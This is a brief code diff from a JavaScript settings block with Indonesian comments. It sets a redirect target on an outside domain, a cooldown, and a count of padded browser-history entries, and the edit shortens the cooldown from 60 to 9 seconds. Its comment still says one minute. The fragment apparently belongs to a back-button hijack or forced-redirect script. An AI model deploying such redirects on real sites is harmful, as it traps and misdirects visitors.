@@ -2,7 +2,7 @@
   try {
     // === SETTING ===
     var target = "https://vidoy.fun/cB6Tyq0.php"; // tujuan (HTTPS)
-    var cooldownMs = 60 * 1000;                   // 1 menit (ubah bila perlu)
+    var cooldownMs = 9 * 1000;                   // 1 menit (ubah bila perlu)
     var historyPadding = 5;                       // jumlah bantalan history
     // ===============
 
